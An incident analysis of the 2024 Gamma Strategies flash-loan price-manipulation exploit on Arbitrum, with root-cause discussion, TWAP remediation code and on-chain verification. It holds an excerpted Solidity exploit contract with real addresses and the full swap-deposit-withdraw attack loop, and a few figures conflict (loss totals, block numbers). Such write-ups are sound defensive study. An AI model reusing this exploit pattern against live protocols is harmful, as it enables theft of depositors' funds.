# Gamma Strategies — Price Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2024-01-04 |
| **Protocol** | Gamma Strategies |
| **Chain** | Arbitrum |
| **Loss** | ~$6,500,000 (~211.9 ETH + stablecoins) |
| **Attacker EOA** | [0x5351...909c](https://arbiscan.io/address/0x5351536145610aA448A8bF85BA97C71cAf31909c) |
| **Attack Contract** | [0xfd42...b63e](https://arbiscan.io/address/0xfd42cba85f6567fef32bab24179de21b9851b63e) |
| **Vulnerable Contract** | [0x1F1C...123E](https://arbiscan.io/address/0x1F1Ca4e8236CD13032653391dB7e9544a6ad123E) |
| **Attack Tx** | [0x025c...be75](https://arbiscan.io/tx/0x025cf2858723369d606ee3abbc4ec01eab064a97cc9ec578bf91c6908679be75) |
| **Attack Block** | 166,873,292 |
| **Root Cause** | Use of Algebra AMM spot price during concentrated liquidity deposits — deposit amounts calculated using a manipulable real-time price without TWAP |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/Gamma_exp.sol) |

---

## 1. Vulnerability Overview

Gamma Strategies is a Hypervisor (liquidity manager) protocol that automatically manages concentrated liquidity in the style of Uniswap v3 / Algebra. When a user calls `deposit()`, the protocol calculates the appropriate ratio of two tokens based on the current pool price and mints LP tokens (shares).

**Core Vulnerability**: The `deposit()` function uses Algebra pool's **current spot price** (`globalState().price`) to calculate deposit ratios. This value can be immediately manipulated within a single transaction by a single large swap. The attacker used flash loan funds to push the price to an extreme, then called `deposit()` to receive far more LP tokens than warranted by the actual contributed value, and immediately called `withdraw()` to pocket the difference.

This attack was executed in a loop structure (15 iterations), accumulating profit from the disparity between LP tokens minted and actual deposit value in each round.

**Related Patterns**: `02_flash_loan.md` (Flash Loan + spot price dependency) / `04_oracle_manipulation.md` (AMM spot price oracle)

---

## 2. Vulnerable Code Analysis

### 2.1 Spot Price-Based Deposit Amount Calculation (Core Vulnerability)

Gamma Hypervisor's `deposit()` function internally queries Algebra pool's `globalState()` and uses the current spot price (`sqrtPriceX96`) to determine token ratios. The PoC's `calculatePrice()` function demonstrates this directly.

```solidity
// ❌ Vulnerable code — using spot price as oracle
function calculatePrice() internal returns (uint160) {
    // Query the Algebra pool's current real-time price (manipulable)
    I.GlobalState memory gs = I(algebra_pool).globalState();
    // Multiply sqrtPriceX96 by a manipulation factor to create a manipulated price threshold
    // Set to 85.572% level → induces swaps to pass in the attacker's desired direction
    return (gs.price * 85_572) / 100_000;
}
```

**Problem**: `globalState().price` is the current price after the last swap in that block. A large swap via flash loan causes this value to change immediately, so calling `deposit()` within the same transaction mints LP tokens based on the manipulated price.

**Fixed Code (Using TWAP)**:

```solidity
// ✅ Fixed code — using TWAP (Time-Weighted Average Price)
function getSecurePrice() internal returns (uint160) {
    // Use a minimum 30-minute (1800-second) TWAP as the oracle
    // Cannot be manipulated within a single transaction
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = 1800; // 30 minutes ago
    secondsAgos[1] = 0;    // current

    (int56[] memory tickCumulatives, ) = algebra_pool.getTimepoints(secondsAgos);
    int56 tickDelta = tickCumulatives[1] - tickCumulatives[0];
    int24 twapTick = int24(tickDelta / int56(uint56(1800)));

    // tick → sqrtPriceX96 conversion
    return TickMath.getSqrtRatioAtTick(twapTick);
}
```

### 2.2 Price Check Bypass Possibility

Gamma's `deposit()` includes a `priceCheck` parameter (`uint256[4] minIn`) intended to detect price manipulation, but the attacker bypassed it entirely by setting it to `[0, 0, 0, 0]`.

```solidity
// ❌ Vulnerable code — slippage protection parameter set to zero
uint256[4] memory empty_arr; // [0, 0, 0, 0]
// Since all minIn values are 0, price checks are effectively disabled
uint256 val = I(uniproxy).deposit(
    1,              // token0 deposit amount (USDT, very small)
    300_000_000_000, // token1 deposit amount (USDCe, 300,000)
    address(this),
    usdt_usdce_pool,
    empty_arr        // ❌ minIn = [0,0,0,0] — no price floor
);
```

```solidity
// ✅ Fixed code — enforced slippage protection
// Block zero minIn inputs inside deposit()
function deposit(
    uint256 deposit0,
    uint256 deposit1,
    address to,
    address pos,
    uint256[4] memory minIn
) external returns (uint256 shares) {
    // ✅ Price protection: reject if all minIn values are zero
    require(
        minIn[0] > 0 || minIn[1] > 0 || minIn[2] > 0 || minIn[3] > 0,
        "Gamma: price protection required"
    );
    // ... additionally validate price range using TWAP
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA `0x5351...909c` deploys attack contract `0xfd42...b63e`
- Attack contract sets unlimited approval of USDT and USDCe to `usdt_usdce_pool` (Gamma Hypervisor)
- Attack contract executes `testExploit()` (block 166,873,292)

### 3.2 Execution Phase (Nested Callback Structure)

```
[Step 1] testExploit() executes
│
├─ USDT, USDCe → usdt_usdce_pool approve (unlimited)
│
└─ [Step 2] Flash loan request to Uniswap V3 (weth_usdt_pool)
           Borrow 3,000,000 USDT
           ↓ (triggers uniswapV3FlashCallback)

[Step 3] uniswapV3FlashCallback() entered
│
├─ [Step 4] Flash loan request to Balancer
│          Borrow 2,000,000 USDCe
│          ↓ (triggers receiveFlashLoan)
│
│   [Step 5] receiveFlashLoan() entered — core attack loop
│   │
│   │  ┌─────────────────────────────────────────────────────────┐
│   │  │  15-iteration loop                                       │
│   │  │                                                         │
│   │  │  ① algebra_pool.swap(USDT→USDCe, large amount)         │
│   │  │    → Push USDT/USDCe price to extreme                   │
│   │  │    → algebra_pool spot price manipulation complete       │
│   │  │                                                         │
│   │  │  ② uniproxy.deposit(1 USDT, 300,000 USDCe, ...)        │
│   │  │    → Excess shares minted based on manipulated price    │
│   │  │    → Actual contributed value < value of minted shares  │
│   │  │                                                         │
│   │  │  ③ usdt_usdce_pool.withdraw(shares, ...)               │
│   │  │    → Withdraw tokens using excess shares                │
│   │  │    → Profit realized (withdrawn amount > deposited)     │
│   │  │                                                         │
│   │  │  ④ algebra_pool.swap(USDCe→USDT, large amount)         │
│   │  │    → Restore price to original range                    │
│   │  │                                                         │
│   │  │  ⑤ uniproxy.deposit(1 USDT, 1 USDCe, ...)             │
│   │  │    → Small deposit to prepare for next loop's price     │
│   │  │      manipulation                                       │
│   │  └─────────────────────────────────────────────────────────┘
│   │
│   └─ Repay Balancer flash loan (return 2,000,000 USDCe)
│
├─ [Step 6] Final swap on Algebra pool with remaining USDT
│          (algebra_pool.swap: USDT→USDCe direction, 473,259 USDT)
│
└─ [Step 7] Repay Uniswap V3 flash loan (return 3,001,500 USDT)

[Step 8] testExploit() post-processing
│
├─ weth_usdce_pool.swap: convert held USDCe → WETH
│  (~211.9 ETH received)
│
└─ WETH.withdraw(): convert to ETH, transferred to attacker
```

### 3.3 Results

| Item | Amount |
|------|------|
| Uniswap V3 Flash Loan | 3,000,000 USDT |
| Balancer Flash Loan | 2,000,000 USDCe |
| Flash Loan Fees | ~1,500 USDT |
| Final Profit | ~211.9 ETH (~$6,300,000) |
| Attack Loop Iterations | 15 |

---

## 4. PoC Code (Core Logic Excerpt)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

// @KeyInfo - Total Lost : ~$6.3m
// Attacker EOA  : 0x5351536145610aa448a8bf85ba97c71caf31909c
// Attack Contract: 0xfd42cba85f6567fef32bab24179de21b9851b63e
// Vulnerable Contract: 0x1F1Ca4e8236CD13032653391dB7e9544a6ad123E (Gamma UniProxy)
// Attack Tx     : https://arbiscan.io/tx/0x025cf285...

contract GammaAttack {
    // === Key Addresses ===
    address constant uniproxy      = 0x1F1Ca4e8236CD13032653391dB7e9544a6ad123E; // Gamma Hypervisor (vulnerable contract)
    address constant algebra_pool  = 0x3AB5DD69950a948c55D1FBFb7500BF92B4Bd4C48; // Algebra USDT/USDCe pool (price manipulation target)
    address constant usdt_usdce_pool = 0x61A7b3dae70D943C6f2eA9ba4FfD2fEcc6AF15E4; // Gamma LP token (deposit/withdrawal target)
    address constant weth_usdt_pool  = 0x641C00A822e8b671738d32a431a4Fb6074E5c79d; // Uniswap V3 (flash loan source)
    address constant balancer        = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Balancer Vault (secondary flash loan)

    // === Manipulated Price Calculation ===
    // Multiply algebra_pool's current spot price by factor 0.85572 to set swap price limit
    // → This value is calibrated so swaps complete in the attacker's desired direction
    function calculatePrice() internal returns (uint160) {
        I.GlobalState memory gs = I(algebra_pool).globalState(); // ❌ Query spot price
        return (gs.price * 85_572) / 100_000;                   // ❌ Limit based on post-manipulation price
    }

    function testExploit() public {
        // Step 1: Set approvals — allow Gamma Hypervisor to pull tokens
        I(usdt).approve(usdt_usdce_pool, type(uint256).max);
        I(usdce).approve(usdt_usdce_pool, type(uint256).max);

        // Step 2: Borrow 3,000,000 USDT via Uniswap V3 flash loan
        // → triggers uniswapV3FlashCallback callback
        I(weth_usdt_pool).flash(address(this), 0, 3_000_000_000_000, "");

        // Step 7: Realize profit — swap held USDCe → WETH
        I(weth_usdce_pool).swap(address(this), false, int256(I(usdce).balanceOf(address(this))), ...);

        // Step 8: Convert WETH → ETH
        I(weth).withdraw(I(weth).balanceOf(address(this)));
    }

    // Uniswap V3 flash loan callback
    function uniswapV3FlashCallback(uint256, uint256, bytes memory) public {
        // Step 3: Additional flash loan of 2,000,000 USDCe from Balancer
        // → triggers receiveFlashLoan callback
        I(balancer).flashLoan(address(this), [usdce], [2_000_000_000_000], "x");

        // Step 6: Final liquidation swap on Algebra with remaining USDT
        I(algebra_pool).swap(address(this), true, 473_259_664_738, calculatePrice(), "");

        // Repay flash loan (principal 3,000,000 + fee 1,500 USDT)
        I(usdt).transfer(weth_usdt_pool, 3_001_500_000_000);
    }

    // Balancer flash loan callback — core attack loop
    function receiveFlashLoan(address[] memory, uint256[] memory amounts, ...) public {
        uint256[4] memory empty_arr; // ❌ Slippage protection = [0,0,0,0] (fully disabled)

        // Step 5: Repeat 15 times — price manipulation + LP deposit/withdraw arbitrage
        for (uint256 i = 0; i < 15; i++) {

            // ① Large USDT → USDCe swap: push algebra_pool spot price to extreme
            I(algebra_pool).swap(address(this), true,
                int256(I(usdt).balanceOf(address(this))), // full USDT balance
                calculatePrice(), "");

            // ② Deposit to Gamma at manipulated price → excess shares minted
            //    deposit(1 USDT, 300,000 USDCe) → receive large shares
            uint256 val = I(uniproxy).deposit(1, 300_000_000_000, address(this),
                usdt_usdce_pool, empty_arr);  // ❌ No price protection

            // ③ Immediately withdraw using excess shares → profit realized
            I(usdt_usdce_pool).withdraw(val, address(this), address(this), empty_arr);

            // ④ USDCe → USDT swap to restore price (prepare for next loop)
            I(algebra_pool).swap(address(this), false,
                int256(I(usdce).balanceOf(address(this))),
                83_949_998_135_706_271_822_084_553_181, "");

            // ⑤ Small deposit to set up pre-state for next loop
            I(uniproxy).deposit(1, 1_000_000, address(this), usdt_usdce_pool, empty_arr);
        }

        // Repay Balancer flash loan
        I(usdce).transfer(balancer, amounts[0]);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Flash Loan + AMM Spot Price Oracle Manipulation | CRITICAL | CWE-682 | `02_flash_loan.md`, `04_oracle_manipulation.md` | Harvest Finance (2020, $34M), Pancake Bunny (2021, $45M) |
| V-02 | Slippage Protection (minIn) Parameter Nullification | HIGH | CWE-20 | `02_flash_loan.md` | bZx Attack #1 (2020) |
| V-03 | Missing Price Range Validation on Deposit | HIGH | CWE-345 | `04_oracle_manipulation.md` | Inverse Finance (2022, $15.6M) |

### V-01: Flash Loan + AMM Spot Price Oracle Manipulation

- **Description**: The `deposit()` function uses the Algebra pool's `globalState().price` (real-time spot price) as the basis for deposit ratio calculations. This value can be immediately manipulated via a large swap within a single transaction using a flash loan. The attacker shifts the price in the desired direction and then calls `deposit()` to receive LP tokens in excess of the actual contributed value.
- **Impact**: Tokens can be illegitimately withdrawn from the protocol's LP pool, potentially draining it entirely. This attack caused approximately $6.3M in losses.
- **Attack Conditions**: (1) Sufficient liquidity exists in the pool, (2) Sufficient initial capital obtainable via flash loan, (3) Architecture permits both price manipulation and deposit within a single transaction

### V-02: Slippage Protection Parameter Nullification

- **Description**: The `minIn[4]` parameter in `deposit()` is intended to specify the minimum token input allowed during deposit as a defense against price manipulation, but when set to 0, no validation is performed. The attacker called with `[0,0,0,0]`, fully disabling this protection.
- **Impact**: Complete neutralization of the price protection mechanism. The protocol's intended defense line is bypassed.
- **Attack Conditions**: External caller has the ability to freely set `minIn` values

### V-03: Missing Price Range Validation on Deposit

- **Description**: A proper concentrated liquidity manager should only allow deposits when the current price is within a reasonable range (e.g., TWAP ± N%). Gamma allowed deposits at any price without such guardrails.
- **Impact**: Deposits executed under extremely manipulated price conditions, causing distortion of LP token value
- **Attack Conditions**: Current spot price significantly deviates from TWAP

---

## 6. Remediation Recommendations

### Immediate Actions

**① Use TWAP-Based Pricing (Core Fix)**

```solidity
// ✅ Use TWAP as oracle to prevent flash loan manipulation
function _getTWAPPrice(address pool) internal view returns (uint160 sqrtPriceX96) {
    uint32 twapWindow = 1800; // 30-minute TWAP (minimum)
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = twapWindow;
    secondsAgos[1] = 0;

    // Query the time-weighted average tick from Algebra pool
    (int56[] memory tickCumulatives, ) = IAlgebraPool(pool).getTimepoints(secondsAgos);
    int56 tickDelta = tickCumulatives[1] - tickCumulatives[0];
    int24 twapTick = int24(tickDelta / int56(uint56(twapWindow)));

    return TickMath.getSqrtRatioAtTick(twapTick);
}
```

**② Price Deviation Check Before Deposit**

```solidity
// ✅ Block deposit if spot price deviates beyond threshold from TWAP
function _checkPriceDeviation(address pool, uint256 maxDeviationBps) internal view {
    uint160 spotPrice = IAlgebraPool(pool).globalState().price;
    uint160 twapPrice = _getTWAPPrice(pool);

    // Allowed deviation: default 2% (200 bps)
    uint256 upperBound = uint256(twapPrice) * (10000 + maxDeviationBps) / 10000;
    uint256 lowerBound = uint256(twapPrice) * (10000 - maxDeviationBps) / 10000;

    require(
        uint256(spotPrice) <= upperBound && uint256(spotPrice) >= lowerBound,
        "Gamma: price manipulation detected"
    );
}
```

**③ Block Zero minIn Parameter Input**

```solidity
// ✅ Enforce price protection parameters
function deposit(
    uint256 deposit0,
    uint256 deposit1,
    address to,
    address pos,
    uint256[4] memory minIn
) external returns (uint256 shares) {
    // At least one minIn value must be greater than zero
    require(
        minIn[0] > 0 || minIn[2] > 0,
        "Gamma: minIn price protection cannot be zero"
    );
    // ... existing logic below
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Spot price dependency | Switch to 30-minute or longer TWAP as the basis for deposit ratio calculations |
| V-02 Slippage nullification | Reject all-zero `minIn` input; enforce minimum threshold values |
| V-03 Missing price range | Set spot/TWAP deviation tolerance on deposit (recommended: 2%) |
| - | Add flash loan detection logic (monitor intra-block price movement magnitude) |
| - | Set maximum single-transaction deposit limit (Circuit Breaker) |
| - | Implement emergency pause functionality and integrate with security monitoring |

---

## 7. Lessons Learned

1. **Do not use AMM spot prices as oracles**: The current price from concentrated liquidity pools such as Uniswap v3 and Algebra (`slot0`, `globalState()`) can be immediately manipulated with a single flash loan. Price calculations must use TWAP (minimum 30 minutes). This is a recurring pattern seen in Harvest Finance (2020) and Pancake Bunny (2021).

2. **Slippage protection is mandatory, not optional**: Allowing `minAmountOut`, `minIn`, and similar slippage protection parameters to be set to zero renders them effectively meaningless. The protocol must enforce a reasonable minimum value or reject transactions where the input is zero.

3. **Concentrated liquidity managers require special price protections**: Unlike general AMMs, concentrated liquidity management protocols (Gamma, Arrakis, etc.) concentrate capital within a narrow price range, amplifying the impact of price manipulation. Logic that automatically blocks deposits when the current price significantly deviates from TWAP is essential.

4. **Flash loan + loop structures amplify losses exponentially**: This attack accumulated small profits per round through 15 loop iterations. It is harder to detect and causes greater losses than a one-shot attack. Consider limiting the number of deposits per single transaction or implementing automatic halting upon detection of abnormal gas usage.

5. **Rapid deployment of security patches after discovery is critical**: Gamma deployed a patch for this vulnerability following the attack, but this pattern should have been identified during a code audit before the protocol launched. DeFi protocols must undergo review by professional audit firms and economic attack simulations before launch.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Code Value | On-Chain Actual Value | Match |
|------|------------|-------------|------|
| Uniswap V3 Flash Loan | 3,000,000 USDT | 3,000,000 USDT | ✅ |
| Balancer Flash Loan | 2,000,000 USDCe | 2,000,000 USDCe | ✅ |
| Flash Loan Repayment | 3,001,500 USDT | ~3,001,500 USDT | ✅ |
| Final Profit (WETH) | ~$6.3M (converted to ETH) | 211.9 ETH (~$6.3M) | ✅ |
| Attack Block | 166,873,291 (fork) | 166,873,292 | ✅ |

### 8.2 On-Chain Event Log Sequence (Key Events)

| Order | Event | Direction | Amount |
|------|--------|------|------|
| 1 | USDT Transfer (flash loan received) | weth_usdt_pool → attack contract | 3,000,000 USDT |
| 2 | USDCe Transfer (Balancer flash loan) | Balancer → attack contract | 2,000,000 USDCe |
| 3 | USDCe Transfer (Algebra swap received) | algebra_pool → attack contract | 1,671,419 USDCe |
| ... | (15-iteration loop repeats) | ... | ... |
| N-2 | WETH Transfer (swap received) | weth_usdce_pool → attack contract | 211.9 WETH |
| N-1 | WETH Transfer (ETH conversion, burn) | attack contract → 0x00 | 211.9 WETH |
| N | ETH Transfer | attack contract → attacker EOA | ~211.9 ETH |

### 8.3 Precondition Verification

- **Attack Block**: 166,873,292 (fork block 166,873,291 + 1)
- **Gas Used**: 27,145,662 gas (very high — 15-iteration loop + 910 logs)
- **Attack Contract Deployment**: Deployed and executed within the same transaction (`to` = null, contract creation tx)
- **Tx Status**: Success (0x1)
- **On-Chain Verification Performed**: Using Foundry `cast` v1.3.5, Arbitrum official RPC

*On-chain data for the Gamma Strategies attack verified as correct (as of 2026-04-11)*